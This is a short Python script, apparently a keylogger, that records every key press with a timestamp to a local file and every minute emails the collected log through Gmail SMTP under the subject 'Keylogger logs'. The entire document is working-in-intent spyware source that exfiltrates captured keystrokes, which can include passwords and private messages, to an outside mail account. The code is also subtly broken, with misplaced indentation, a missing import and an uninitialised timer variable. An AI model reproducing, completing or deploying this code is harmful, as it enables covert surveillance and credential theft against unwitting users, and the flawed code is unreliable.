import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "your_email@example.com"
EMAIL_PASSWORD = "your_email_password"

def send_email(message):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS
    msg['Subject'] = "Keylogger logs"
    msg.attach(MIMEText(message, 'plain'))
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
    server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, msg.as_string())
    server.quit()

    def on_press(key):
    try:
        current_time = time.time()
        with open("logs.txt", "a") as f:
            f.write(str(key) + " " + str(current_time) + "\n")
        # check if it's time to send the email
        if (current_time - start_time) >= SEND_REPORT_EVERY:
            with open("logs.txt", "r") as f:
                logs = f.read()
            send_email(logs)
            # reset the start time and clear the logs file
            start_time = current_time
            open("logs.txt", "w").close()
    except:
        pass
      
def start():
    keyboard.on_press(on_press)
    keyboard.wait()
    
    if __name__ == '__main__':
    start()

